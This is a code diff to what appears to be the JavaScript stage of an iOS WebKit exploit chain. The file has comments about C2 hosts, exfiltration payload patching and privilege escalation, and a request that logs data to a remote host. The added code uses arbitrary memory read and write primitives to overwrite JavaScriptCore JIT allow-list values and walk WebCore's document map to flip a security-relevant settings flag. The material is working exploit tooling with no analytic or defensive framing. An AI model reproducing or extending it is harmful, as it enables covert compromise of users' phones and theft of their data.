@@ -237,7 +237,7 @@ function print(x, reportError = false, dumphex = false) {
     try {
         let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
         const xhr = new XMLHttpRequest();
-        xhr.open("GET", host + "/log.html?" + req , true);
+        xhr.open("GET", String(host || '').replace(/\/$/, '') + "/log.html?" + req , true);
         xhr.send(null);
     } catch (e) {}
   }
@@ -280,7 +280,7 @@ function applyExfilFromData(data) {
 }
 function patchExfilPayload(script) {
   // iosc2: PE/C2 hosts come from delivery template (__C2_*/__HQ_*/__SEN_*).
-  // External lab host rewrite removed â return payload unchanged.
+  // External lab host rewrite removed — return payload unchanged.
   return script;
 }
 function shouldPatchExfil(fname) {
@@ -292,7 +292,7 @@ function shouldPatchExfil(fname) {
 
 function getJS(fname, method = 'GET', tries = 5)
   {
-      // Early PE lock: postMessage is async â spin so main can markPeDone
+      // Early PE lock: postMessage is async — spin so main can markPeDone
       // before WebContent dies (esp. when pe_worker is cached / instant).
       try {
         var _fn = String(fname || '');
@@ -355,6 +355,7 @@ function getJS(fname, method = 'GET', tries = 5)
           begin = data.begin;
           ios_version = data.ios_version;
           origin = data.origin;
+          self.__channelCode = data.channelCode || '';
           const device_model = data.device_model;
           const chipset = data.chipset;
           const offsets = unpackOffsetsMap(data.offsets);
@@ -459,6 +460,33 @@ function getJS(fname, method = 'GET', tries = 5)
           p.write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
           p.write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
           print("after write");
+          try {
+              const docsMap = offsets.WebCore__ZZN7WebCore8Document15allDocumentsMapEvE9documents;
+              if (docsMap) {
+              const table = p.read64(docsMap);
+              const heapPtr = (v) => v >= 0x100000000n && v < 0x200000000n;
+              let flipped = false;
+              for (let off = 0n; off < 0x200n; off += 8n) {
+                  const impl = p.read64(table + off);
+                  if (!heapPtr(impl) || (impl >= table && impl < table + 0x400n)) continue;
+                  for (const wo of [0x8n, 0x10n, 0x18n]) {
+                      const doc = p.read64(impl + wo);
+                      if (!heapPtr(doc)) continue;
+                      const settings = p.read64(doc + 0x2c0n);
+                      if (!heapPtr(settings)) continue;
+                      const flagAddr = settings + 0x2can;
+                      const before = p.read64(flagAddr);
+                      if ((before & 0xf0n) != 0x80n && (before & 0xf0n) != 0x90n) continue;
+                      if (!(before & 0x10n)) {
+                          p.write64(flagAddr, before | 0x10n);
+                      }
+                      flipped = true;
+                      break;
+                  }
+                  if (flipped) break;
+              }
+              }
+          } catch (eGate) {}
           self.postMessage({
             type: 'prepare_dlopen_workers'
           });
